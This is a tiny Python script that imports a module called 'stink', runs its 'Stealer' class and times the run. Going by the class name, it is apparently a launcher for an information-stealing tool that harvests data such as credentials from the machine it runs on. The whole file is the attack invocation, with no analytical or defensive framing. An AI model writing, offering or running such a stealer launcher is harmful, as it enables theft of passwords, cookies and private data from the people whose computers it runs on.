import stink
from datetime import datetime

if __name__ == "__main__":
    start = datetime.now()
    stink.Stealer().run()
    print(datetime.now() - start)
